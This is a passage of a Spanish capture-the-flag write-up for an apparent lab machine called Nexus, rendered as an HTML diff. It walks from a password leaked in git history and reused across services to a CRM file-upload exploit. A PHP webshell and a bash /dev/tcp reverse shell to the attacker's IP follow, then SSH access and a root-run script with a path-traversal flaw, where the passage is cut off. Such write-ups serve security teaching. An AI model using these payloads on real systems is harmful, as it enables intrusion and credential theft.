+<a id="__codelineno-27-6" name="__codelineno-27-6" href="#__codelineno-27-6"></a>+APP_KEY=
+<a id="__codelineno-27-7" name="__codelineno-27-7" href="#__codelineno-27-7"></a>+DB_PASSWORD=N27xh!!2ucY04
+<a id="__codelineno-27-8" name="__codelineno-27-8" href="#__codelineno-27-8"></a>...
+</code></pre></div>
 <p>Aquí está el fallo. El <strong>primer commit</strong> (<code>1615c46</code>) subió el <code>.env</code> con la contraseña de base de datos en claro, y el <strong>segundo commit</strong> (<code>9b817fa</code>) la eliminó. Pero esa contraseña sigue perfectamente accesible en el historial:</p>
-<pre><code class="language-text">DB_PASSWORD=N27xh!!2ucY04
-</code></pre>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>DB_PASSWORD=N27xh!!2ucY04
+</code></pre></div>
 <p>Además, el autor de los commits es <strong><code>admin@nexus.htb</code></strong>, lo que nos da un correo válido asociado al administrador. En entornos reales (y especialmente en estas máquinas) es muy común la <strong>reutilización de contraseñas</strong>, así que probaremos esta credencial contra el panel de Krayin, Gitea y SSH.</p>
 <table>
 <thead>
@@ -1551,12 +1604,12 @@ Author: admin &lt;admin@nexus.htb&gt;
 </tr>
 </tbody>
 </table>
-<h2 id="2-acceso-inicial-foothold">2. Acceso Inicial (Foothold)</h2>
-<h3 id="acceso-al-panel-de-krayin-reutilizacion-de-credenciales">Acceso al panel de Krayin (reutilización de credenciales)</h3>
+<h2 id="2-acceso-inicial-foothold">2. Acceso Inicial (Foothold)<a class="headerlink" href="#2-acceso-inicial-foothold" title="Permanent link">&para;</a></h2>
+<h3 id="acceso-al-panel-de-krayin-reutilizacion-de-credenciales">Acceso al panel de Krayin (reutilización de credenciales)<a class="headerlink" href="#acceso-al-panel-de-krayin-reutilizacion-de-credenciales" title="Permanent link">&para;</a></h3>
 <p>Probamos la contraseña filtrada contra el panel de administración de Krayin. Tras varios intentos con los distintos correos candidatos, la combinación que funciona es la del <em>hiring manager</em> que habíamos anotado en la enumeración web:</p>
-<pre><code class="language-text">Usuario:    j.matthew@nexus.htb
-Contraseña: N27xh!!2ucY04
-</code></pre>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>Usuario:    j.matthew@nexus.htb
+<a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>Contraseña: N27xh!!2ucY04
+</code></pre></div>
 <p>Iniciamos sesión correctamente y accedemos al <code>/admin/dashboard</code> del CRM:</p>
 <p><img alt="cap9" src="cap9.png" /></p>
 <blockquote>
@@ -1564,9 +1617,9 @@ Contraseña: N27xh!!2ucY04
 </blockquote>
 <p>Haciendo clic sobre nuestro usuario (esquina superior derecha) vemos la versión exacta de la aplicación:</p>
 <p><img alt="cap10" src="cap10.png" /></p>
-<pre><code class="language-text">Version: 2.2.0
-</code></pre>
-<h3 id="cve-2026-38526-subida-de-ficheros-arbitraria-autenticada-rce">CVE-2026-38526 — Subida de ficheros arbitraria autenticada (RCE)</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>Version: 2.2.0
+</code></pre></div>
+<h3 id="cve-2026-38526-subida-de-ficheros-arbitraria-autenticada-rce">CVE-2026-38526 — Subida de ficheros arbitraria autenticada (RCE)<a class="headerlink" href="#cve-2026-38526-subida-de-ficheros-arbitraria-autenticada-rce" title="Permanent link">&para;</a></h3>
 <p>Una búsqueda de vulnerabilidades para <strong>Krayin CRM 2.2.x</strong> nos lleva a <strong>CVE-2026-38526</strong>, un fallo crítico (CVSS 9.9) de <strong>subida de ficheros arbitraria autenticada que deriva en ejecución remota de código (RCE)</strong>. Existe PoC pública en Exploit-DB (ID 52629).</p>
 <p>El flujo técnico de la vulnerabilidad es el siguiente:</p>
 <ol>
@@ -1581,170 +1634,170 @@ Contraseña: N27xh!!2ucY04
 <li><a href="https://socradar.io/blog/cve-2026-38526-krayin-crm-rce/">SOCRadar — CVE-2026-38526 Krayin CRM RCE</a></li>
 </ul>
 <p>Dado que ya disponemos de una sesión válida en el panel, cumplimos el único requisito del exploit (estar autenticados), por lo que podemos abusar de este <em>endpoint</em> para conseguir nuestro punto de entrada en la máquina.</p>
-<h3 id="explotacion-de-la-subida-al-rce">Explotación: de la subida al RCE</h3>
+<h3 id="explotacion-de-la-subida-al-rce">Explotación: de la subida al RCE<a class="headerlink" href="#explotacion-de-la-subida-al-rce" title="Permanent link">&para;</a></h3>
 <p>Descargamos el PoC desde Exploit-DB y lo analizamos:</p>
-<pre><code class="language-bash">searchsploit -m 52629
-</code></pre>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>searchsploit<span class="w"> </span>-m<span class="w"> </span><span class="m">52629</span>
+</code></pre></div>
 <p>El script es sencillo: hace <em>login</em> con nuestras credenciales, recupera el token <code>XSRF-TOKEN</code> de la cookie de sesión, y sube el fichero que le indiquemos al <em>endpoint</em> <code>/admin/tinymce/upload</code>, devolviéndonos la URL final del archivo. <strong>Importante:</strong> el exploit únicamente <strong>sube</strong> el fichero; la ejecución la provocaremos nosotros visitando su URL.</p>
 <p>Creamos un <em>webshell</em> mínimo en PHP que ejecute comandos recibidos por el parámetro <code>cmd</code>:</p>
-<pre><code class="language-bash">echo '&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;' &gt; shell.php
-</code></pre>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>shell.php
+</code></pre></div>
 <p>Y lanzamos el exploit (ojo con los <em>flags</em>: <code>-t</code> es la URL, <code>-u</code> el usuario, <code>-p</code> la contraseña y <code>-f</code> el fichero):</p>
-<pre><code class="language-bash">python3 52629.py -t http://billing.nexus.htb -u j.matthew@nexus.htb -p 'N27xh!!2ucY04' -f shell.php
-</code></pre>
-<pre><code class="language-text">[+] File uploaded successfully.
-Path to file: http://billing.nexus.htb/storage/tinymce/829abd99c7cf1a4020f95b02ec7f3668.php
-</code></pre>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>python3<span class="w"> </span><span class="m">52629</span>.py<span class="w"> </span>-t<span class="w"> </span>http://billing.nexus.htb<span class="w"> </span>-u<span class="w"> </span>j.matthew@nexus.htb<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;N27xh!!2ucY04&#39;</span><span class="w"> </span>-f<span class="w"> </span>shell.php
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>[+] File uploaded successfully.
+<a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a>Path to file: http://billing.nexus.htb/storage/tinymce/829abd99c7cf1a4020f95b02ec7f3668.php
+</code></pre></div>
 <p>El fichero se ha guardado <strong>conservando su extensión <code>.php</code></strong> en una ruta pública. Comprobamos que efectivamente tenemos ejecución remota de comandos pasándole <code>cmd=id</code>:</p>
-<pre><code class="language-bash">curl &quot;http://billing.nexus.htb/storage/tinymce/829abd99c7cf1a4020f95b02ec7f3668.php?cmd=id&quot;
-</code></pre>
-<pre><code class="language-text">uid=33(www-data) gid=33(www-data) groups=33(www-data)
-</code></pre>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>curl<span class="w"> </span><span class="s2">&quot;http://billing.nexus.htb/storage/tinymce/829abd99c7cf1a4020f95b02ec7f3668.php?cmd=id&quot;</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre></div>
 <p><img alt="cap11" src="cap11.png" /></p>
-<h3 id="reverse-shell">Reverse Shell</h3>
+<h3 id="reverse-shell">Reverse Shell<a class="headerlink" href="#reverse-shell" title="Permanent link">&para;</a></h3>
 <p>Con el RCE confirmado, lanzamos una <em>reverse shell</em>. Dejamos un <em>listener</em> a la escucha en nuestra máquina (en este caso usamos <strong>penelope</strong>, por comodidad con el <em>upgrade</em> automático a PTY) y disparamos la conexión.</p>
 <p>Como nuestro <em>webshell</em> lee el comando desde <code>$_GET</code>, forzamos que <code>curl</code> envíe el parámetro por la <em>query string</em> con el <em>flag</em> <code>-G</code> (de lo contrario lo mandaría en el cuerpo POST y <code>$_GET</code> no lo recibiría):</p>
-<pre><code class="language-bash">curl -G &quot;http://billing.nexus.htb/storage/tinymce/829abd99c7cf1a4020f95b02ec7f3668.php&quot; --data-urlencode &quot;cmd=bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;TU_IP&gt;/4444 0&gt;&amp;1'&quot;
-</code></pre>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>curl<span class="w"> </span>-G<span class="w"> </span><span class="s2">&quot;http://billing.nexus.htb/storage/tinymce/829abd99c7cf1a4020f95b02ec7f3668.php&quot;</span><span class="w"> </span>--data-urlencode<span class="w"> </span><span class="s2">&quot;cmd=bash -c &#39;bash -i &gt;&amp; /dev/tcp/&lt;TU_IP&gt;/4444 0&gt;&amp;1&#39;&quot;</span>
+</code></pre></div>
 <p>En nuestro <em>listener</em> recibimos la conexión como <code>www-data</code>, con la shell ya estabilizada a PTY:</p>
-<pre><code class="language-text">[+] Got reverse shell from nexus~10.129.176.242-Linux-x86_64 😍️ Assigned SessionID &lt;1&gt;
-[+] Attempting to upgrade shell to PTY...
-[+] Shell upgraded successfully using /usr/bin/python3! 💪
-
-www-data@nexus:~/krayin/storage/app/public/tinymce$ id
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-</code></pre>
-<p><img alt="cap12" src="cap12.png" /></p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>[+] Got reverse shell from nexus~10.129.176.242-Linux-x86_64 😍️ Assigned SessionID &lt;1&gt;
+<a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a>[+] Attempting to upgrade shell to PTY...
+<a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a>[+] Shell upgraded successfully using /usr/bin/python3! 💪
+<a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a>
+<a id="__codelineno-38-5" name="__codelineno-38-5" href="#__codelineno-38-5"></a>www-data@nexus:~/krayin/storage/app/public/tinymce$ id
+<a id="__codelineno-38-6" name="__codelineno-38-6" href="#__codelineno-38-6"></a>uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre></div>
+<img alt="cap12" src="cap12.png" /></p>
 <p>Ya tenemos un punto de apoyo dentro de la máquina. El siguiente paso es enumerar el sistema para movernos hacia un usuario con mayores privilegios.</p>
-<h2 id="3-movimiento-lateral-pivotando-a-jones">3. Movimiento Lateral (Pivotando a jones)</h2>
-<h3 id="enumeracion-como-www-data">Enumeración como www-data</h3>
+<h2 id="3-movimiento-lateral-pivotando-a-jones">3. Movimiento Lateral (Pivotando a jones)<a class="headerlink" href="#3-movimiento-lateral-pivotando-a-jones" title="Permanent link">&para;</a></h2>
+<h3 id="enumeracion-como-www-data">Enumeración como www-data<a class="headerlink" href="#enumeracion-como-www-data" title="Permanent link">&para;</a></h3>
 <p>Como <code>www-data</code> no es un usuario interactivo, nuestro objetivo es movernos a un usuario real. Listamos los usuarios con directorio personal:</p>
-<pre><code class="language-bash">ls -la /home
-</code></pre>
-<pre><code class="language-text">drwxr-x---  2 git   git   4096 May 12 12:27 git
-drwxr-x---  3 jones jones 4096 May 12 12:26 jones
-</code></pre>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>ls<span class="w"> </span>-la<span class="w"> </span>/home
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>drwxr-x---  2 git   git   4096 May 12 12:27 git
+<a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a>drwxr-x---  3 jones jones 4096 May 12 12:26 jones
+</code></pre></div>
 <p>Aparecen dos usuarios: <code>git</code> (asociado al servicio Gitea) y <strong><code>jones</code></strong>, que ya habíamos visto como usuario de Gitea durante la enumeración.</p>
 <p>Lo primero que revisamos es el fichero de configuración <code>.env</code> real de la aplicación Krayin, que ahora sí es accesible desde el sistema de ficheros (recordemos que el del repositorio estaba vacío):</p>
-<pre><code class="language-bash">cat ~/krayin/.env
-</code></pre>
-<pre><code class="language-text">APP_KEY=base64:n4swv+4YcBtCr1OPHBe69GxK06/X1y1vCQU1SIMIC7Q=
-...
-DB_CONNECTION=mysql
-DB_HOST=127.0.0.1
-DB_DATABASE=krayin
-DB_USERNAME=krayin
-DB_PASSWORD=y27xb3ha!!74GbR
-...
-</code></pre>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>cat<span class="w"> </span>~/krayin/.env
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>APP_KEY=base64:n4swv+4YcBtCr1OPHBe69GxK06/X1y1vCQU1SIMIC7Q=
+<a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a>...
+<a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a>DB_CONNECTION=mysql
+<a id="__codelineno-42-4" name="__codelineno-42-4" href="#__codelineno-42-4"></a>DB_HOST=127.0.0.1
+<a id="__codelineno-42-5" name="__codelineno-42-5" href="#__codelineno-42-5"></a>DB_DATABASE=krayin
+<a id="__codelineno-42-6" name="__codelineno-42-6" href="#__codelineno-42-6"></a>DB_USERNAME=krayin
+<a id="__codelineno-42-7" name="__codelineno-42-7" href="#__codelineno-42-7"></a>DB_PASSWORD=y27xb3ha!!74GbR
+<a id="__codelineno-42-8" name="__codelineno-42-8" href="#__codelineno-42-8"></a>...
+</code></pre></div>
 <p>Aquí encontramos la <strong>contraseña real de la base de datos</strong>: <code>y27xb3ha!!74GbR</code> (distinta de la que vimos filtrada en el historial de Git). Revisamos también los servicios que escuchan localmente:</p>
-<pre><code class="language-bash">ss -tlnp
-</code></pre>
-<pre><code class="language-text">LISTEN 0 151       127.0.0.1:3306    0.0.0.0:*     # MySQL
-LISTEN 0 70        127.0.0.1:33060   0.0.0.0:*     # MySQL X Protocol
-LISTEN 0 4096      127.0.0.1:3000    0.0.0.0:*     # Gitea (proxyado por nginx en git.nexus.htb)
-LISTEN 0 511         0.0.0.0:80      0.0.0.0:*     # nginx
-LISTEN 0 4096        0.0.0.0:22      0.0.0.0:*     # SSH
-</code></pre>
-<h3 id="reutilizacion-de-credenciales-ssh-como-jones">Reutilización de credenciales → SSH como jones</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>ss<span class="w"> </span>-tlnp
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>LISTEN 0 151       127.0.0.1:3306    0.0.0.0:*     # MySQL
+<a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a>LISTEN 0 70        127.0.0.1:33060   0.0.0.0:*     # MySQL X Protocol
+<a id="__codelineno-44-3" name="__codelineno-44-3" href="#__codelineno-44-3"></a>LISTEN 0 4096      127.0.0.1:3000    0.0.0.0:*     # Gitea (proxyado por nginx en git.nexus.htb)
+<a id="__codelineno-44-4" name="__codelineno-44-4" href="#__codelineno-44-4"></a>LISTEN 0 511         0.0.0.0:80      0.0.0.0:*     # nginx
+<a id="__codelineno-44-5" name="__codelineno-44-5" href="#__codelineno-44-5"></a>LISTEN 0 4096        0.0.0.0:22      0.0.0.0:*     # SSH
+</code></pre></div>
+<h3 id="reutilizacion-de-credenciales-ssh-como-jones">Reutilización de credenciales → SSH como jones<a class="headerlink" href="#reutilizacion-de-credenciales-ssh-como-jones" title="Permanent link">&para;</a></h3>
 <p>Con una contraseña válida en la mano, el siguiente paso lógico ante un usuario del sistema como <code>jones</code> es comprobar si existe <strong>reutilización de credenciales</strong>. Probamos a autenticarnos por SSH.</p>
 <p>La contraseña del <code>.env</code> resulta ser válida también para la cuenta de <code>jones</code>, concediéndonos acceso por SSH como un usuario legítimo del sistema:</p>
-<pre><code class="language-text">nexus ssh jones@nexus.htb                  
-The authenticity of host 'nexus.htb (10.129.176.242)' can't be established.
-ED25519 key fingerprint is: SHA256:OZNUeTZ9jastNKKQ1tFXatbeOZzSFg5Dt7nhwhjorR0
-This key is not known by any other names.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added 'nexus.htb' (ED25519) to the list of known hosts.
-jones@nexus.htb's password: 
-Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-111-generic x86_64)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/pro
-
- System information as of Tue Oct 20 07:10:22 PM UTC 2026
-
-  System load:           0.0
-  Usage of /:            66.7% of 6.48GB
-  Memory usage:          19%
-  Swap usage:            0%
-  Processes:             227
-  Users logged in:       0
-  IPv4 address for eth0: 10.129.176.242
-  IPv6 address for eth0: dead:beef::a0de:adff:fe6a:4332
-
- * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
-   just raised the bar for easy, resilient and secure K8s cluster deployment.
-
-   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
-
-Expanded Security Maintenance for Applications is not enabled.
-
-1 update can be applied immediately.
-To see these additional updates run: apt list --upgradable
-
-Enable ESM Apps to receive additional future security updates.
-See https://ubuntu.com/esm or run: sudo pro status
-
-
-The list of available updates is more than a week old.
-To check for new updates run: sudo apt update
-jones@nexus:~$ ls
-user.txt
-jones@nexus:~$ cat user.txt 
-[REDACTED]
-</code></pre>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>nexus ssh jones@nexus.htb                  
+<a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a>The authenticity of host &#39;nexus.htb (10.129.176.242)&#39; can&#39;t be established.
+<a id="__codelineno-45-3" name="__codelineno-45-3" href="#__codelineno-45-3"></a>ED25519 key fingerprint is: SHA256:OZNUeTZ9jastNKKQ1tFXatbeOZzSFg5Dt7nhwhjorR0
+<a id="__codelineno-45-4" name="__codelineno-45-4" href="#__codelineno-45-4"></a>This key is not known by any other names.
+<a id="__codelineno-45-5" name="__codelineno-45-5" href="#__codelineno-45-5"></a>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+<a id="__codelineno-45-6" name="__codelineno-45-6" href="#__codelineno-45-6"></a>Warning: Permanently added &#39;nexus.htb&#39; (ED25519) to the list of known hosts.
+<a id="__codelineno-45-7" name="__codelineno-45-7" href="#__codelineno-45-7"></a>jones@nexus.htb&#39;s password: 
+<a id="__codelineno-45-8" name="__codelineno-45-8" href="#__codelineno-45-8"></a>Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-111-generic x86_64)
+<a id="__codelineno-45-9" name="__codelineno-45-9" href="#__codelineno-45-9"></a>
+<a id="__codelineno-45-10" name="__codelineno-45-10" href="#__codelineno-45-10"></a> * Documentation:  https://help.ubuntu.com
+<a id="__codelineno-45-11" name="__codelineno-45-11" href="#__codelineno-45-11"></a> * Management:     https://landscape.canonical.com
+<a id="__codelineno-45-12" name="__codelineno-45-12" href="#__codelineno-45-12"></a> * Support:        https://ubuntu.com/pro
+<a id="__codelineno-45-13" name="__codelineno-45-13" href="#__codelineno-45-13"></a>
+<a id="__codelineno-45-14" name="__codelineno-45-14" href="#__codelineno-45-14"></a> System information as of Tue Oct 20 07:10:22 PM UTC 2026
+<a id="__codelineno-45-15" name="__codelineno-45-15" href="#__codelineno-45-15"></a>
+<a id="__codelineno-45-16" name="__codelineno-45-16" href="#__codelineno-45-16"></a>  System load:           0.0
+<a id="__codelineno-45-17" name="__codelineno-45-17" href="#__codelineno-45-17"></a>  Usage of /:            66.7% of 6.48GB
+<a id="__codelineno-45-18" name="__codelineno-45-18" href="#__codelineno-45-18"></a>  Memory usage:          19%
+<a id="__codelineno-45-19" name="__codelineno-45-19" href="#__codelineno-45-19"></a>  Swap usage:            0%
+<a id="__codelineno-45-20" name="__codelineno-45-20" href="#__codelineno-45-20"></a>  Processes:             227
+<a id="__codelineno-45-21" name="__codelineno-45-21" href="#__codelineno-45-21"></a>  Users logged in:       0
+<a id="__codelineno-45-22" name="__codelineno-45-22" href="#__codelineno-45-22"></a>  IPv4 address for eth0: 10.129.176.242
+<a id="__codelineno-45-23" name="__codelineno-45-23" href="#__codelineno-45-23"></a>  IPv6 address for eth0: dead:beef::a0de:adff:fe6a:4332
+<a id="__codelineno-45-24" name="__codelineno-45-24" href="#__codelineno-45-24"></a>
+<a id="__codelineno-45-25" name="__codelineno-45-25" href="#__codelineno-45-25"></a> * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+<a id="__codelineno-45-26" name="__codelineno-45-26" href="#__codelineno-45-26"></a>   just raised the bar for easy, resilient and secure K8s cluster deployment.
+<a id="__codelineno-45-27" name="__codelineno-45-27" href="#__codelineno-45-27"></a>
+<a id="__codelineno-45-28" name="__codelineno-45-28" href="#__codelineno-45-28"></a>   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+<a id="__codelineno-45-29" name="__codelineno-45-29" href="#__codelineno-45-29"></a>
+<a id="__codelineno-45-30" name="__codelineno-45-30" href="#__codelineno-45-30"></a>Expanded Security Maintenance for Applications is not enabled.
+<a id="__codelineno-45-31" name="__codelineno-45-31" href="#__codelineno-45-31"></a>
+<a id="__codelineno-45-32" name="__codelineno-45-32" href="#__codelineno-45-32"></a>1 update can be applied immediately.
+<a id="__codelineno-45-33" name="__codelineno-45-33" href="#__codelineno-45-33"></a>To see these additional updates run: apt list --upgradable
+<a id="__codelineno-45-34" name="__codelineno-45-34" href="#__codelineno-45-34"></a>
+<a id="__codelineno-45-35" name="__codelineno-45-35" href="#__codelineno-45-35"></a>Enable ESM Apps to receive additional future security updates.
+<a id="__codelineno-45-36" name="__codelineno-45-36" href="#__codelineno-45-36"></a>See https://ubuntu.com/esm or run: sudo pro status
+<a id="__codelineno-45-37" name="__codelineno-45-37" href="#__codelineno-45-37"></a>
+<a id="__codelineno-45-38" name="__codelineno-45-38" href="#__codelineno-45-38"></a>
+<a id="__codelineno-45-39" name="__codelineno-45-39" href="#__codelineno-45-39"></a>The list of available updates is more than a week old.
+<a id="__codelineno-45-40" name="__codelineno-45-40" href="#__codelineno-45-40"></a>To check for new updates run: sudo apt update
+<a id="__codelineno-45-41" name="__codelineno-45-41" href="#__codelineno-45-41"></a>jones@nexus:~$ ls
+<a id="__codelineno-45-42" name="__codelineno-45-42" href="#__codelineno-45-42"></a>user.txt
+<a id="__codelineno-45-43" name="__codelineno-45-43" href="#__codelineno-45-43"></a>jones@nexus:~$ cat user.txt 
+<a id="__codelineno-45-44" name="__codelineno-45-44" href="#__codelineno-45-44"></a>[REDACTED]
+</code></pre></div>
 <p>Con la primera flag capturada, pasamos a la fase de escalada de privilegios hacia <code>root</code>.</p>
-<h2 id="4-escalada-de-privilegios-root">4. Escalada de Privilegios (Root)</h2>
-<h3 id="enumeracion-un-timer-sospechoso">Enumeración: un timer sospechoso</h3>
+<h2 id="4-escalada-de-privilegios-root">4. Escalada de Privilegios (Root)<a class="headerlink" href="#4-escalada-de-privilegios-root" title="Permanent link">&para;</a></h2>
+<h3 id="enumeracion-un-timer-sospechoso">Enumeración: un timer sospechoso<a class="headerlink" href="#enumeracion-un-timer-sospechoso" title="Permanent link">&para;</a></h3>
 <p>Tras descartar los vectores habituales (<code>sudo -l</code> sin permisos, SUID/SGID estándar, sin capabilities útiles —el <code>pam_cap</code> apuntaba al fichero de ejemplo por defecto—, y sin credenciales nuevas en la base de datos), revisamos los <em>timers</em> de systemd en busca de tareas periódicas:</p>
-<pre><code class="language-bash">systemctl list-timers
-</code></pre>
-<pre><code class="language-text">NEXT                        LEFT     LAST                        PASSED       UNIT                         ACTIVATES
-Wed 2026-10-21 18:15:06 UTC  51s     Wed 2026-10-21 18:14:06 UTC  8s ago      gitea-template-sync.timer    gitea-template-sync.service
-...
-</code></pre>
-<p><img alt="cap13" src="cap13.png" /></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>systemctl<span class="w"> </span>list-timers
+</code></pre></div>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>NEXT                        LEFT     LAST                        PASSED       UNIT                         ACTIVATES
+<a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a>Wed 2026-10-21 18:15:06 UTC  51s     Wed 2026-10-21 18:14:06 UTC  8s ago      gitea-template-sync.timer    gitea-template-sync.service
+<a id="__codelineno-47-3" name="__codelineno-47-3" href="#__codelineno-47-3"></a>...
+</code></pre></div>
+<img alt="cap13" src="cap13.png" /></p>
 <p>Entre los <em>timers</em> del sistema destaca uno que <strong>no es estándar</strong> de Ubuntu: <code>gitea-template-sync.timer</code>, que se ejecuta <strong>cada minuto</strong>. Inspeccionamos la unidad y el servicio que dispara:</p>
-<pre><code class="language-bash">systemctl cat gitea-template-sync.timer gitea-template-sync.service
-</code></pre>
-<pre><code class="language-text"># /etc/systemd/system/gitea-template-sync.service
-[Unit]
-Description=Sync Gitea templates
-After=network-online.target
-
-[Service]
-Type=oneshot
-User=root
-ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py
-TimeoutStartSec=50s
-</code></pre>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a>systemctl<span class="w"> </span>cat<span class="w"> </span>gitea-template-sync.timer<span class="w"> </span>gitea-template-sync.service
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a># /etc/systemd/system/gitea-template-sync.service
+<a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a>[Unit]
+<a id="__codelineno-49-3" name="__codelineno-49-3" href="#__codelineno-49-3"></a>Description=Sync Gitea templates
+<a id="__codelineno-49-4" name="__codelineno-49-4" href="#__codelineno-49-4"></a>After=network-online.target
+<a id="__codelineno-49-5" name="__codelineno-49-5" href="#__codelineno-49-5"></a>
+<a id="__codelineno-49-6" name="__codelineno-49-6" href="#__codelineno-49-6"></a>[Service]
+<a id="__codelineno-49-7" name="__codelineno-49-7" href="#__codelineno-49-7"></a>Type=oneshot
+<a id="__codelineno-49-8" name="__codelineno-49-8" href="#__codelineno-49-8"></a>User=root
+<a id="__codelineno-49-9" name="__codelineno-49-9" href="#__codelineno-49-9"></a>ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py
+<a id="__codelineno-49-10" name="__codelineno-49-10" href="#__codelineno-49-10"></a>TimeoutStartSec=50s
+</code></pre></div>
 <p>Dos datos críticos: el servicio corre como <strong><code>User=root</code></strong> y ejecuta un script Python en <code>/etc/gitea/template-sync.py</code>. Ese script sí es legible por nuestro usuario:</p>
-<pre><code class="language-bash">cat /etc/gitea/template-sync.py
-</code></pre>
-<h3 id="analisis-de-la-vulnerabilidad-path-traversal-escritura-arbitraria-como-root">Análisis de la vulnerabilidad (Path Traversal → escritura arbitraria como root)</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a>cat<span class="w"> </span>/etc/gitea/template-sync.py
+</code></pre></div>
+<h3 id="analisis-de-la-vulnerabilidad-path-traversal-escritura-arbitraria-como-root">Análisis de la vulnerabilidad (Path Traversal → escritura arbitraria como root)<a class="headerlink" href="#analisis-de-la-vulnerabilidad-path-traversal-escritura-arbitraria-como-root" title="Permanent link">&para;</a></h3>
 <p>El script, resumido, hace lo siguiente <strong>como root, cada minuto</strong>:</p>
 <ol>
 <li>Consulta la API de Gitea y selecciona los repositorios marcados como <strong>template</strong> (<code>template: true</code>).</li>
 <li>Por cada uno, lee el repositorio <em>bare</em> en disco (<code>/var/lib/gitea/data/gitea-repositories/&lt;owner&gt;/&lt;name&gt;.git</code>) listando sus ficheros con <code>git ls-tree -r HEAD</code> y extrayendo el contenido de cada <em>blob</em> con <code>git cat-file blob</code>.</li>
 <li>Escribe cada fichero en un directorio de <em>staging</em>:</li>
 </ol>
-<pre><code class="language-python">def sync_template(repo_info):
-    owner = repo_info['owner']['login']
-    name = repo_info['name'].lower()
-    ...
-    stage_path = os.path.join(STAGING_DIR, owner, name)   # /home/git/template-staging/&lt;owner&gt;/&lt;name&gt;
-    ...
-    for mode, objhash, filepath in entries:
-        target = os.path.join(stage_path, filepath)       # &lt;-- filepath NO se sanea
-        target_dir = os.path.dirname(target)
-        os.makedirs(target_dir, exist_ok=True)            # crea directorios como root
-        ...
-        with open(target, 'wb') as f:                     # escribe como root
-            f.write(cat_result.stdout)
-        if mode == '100755':
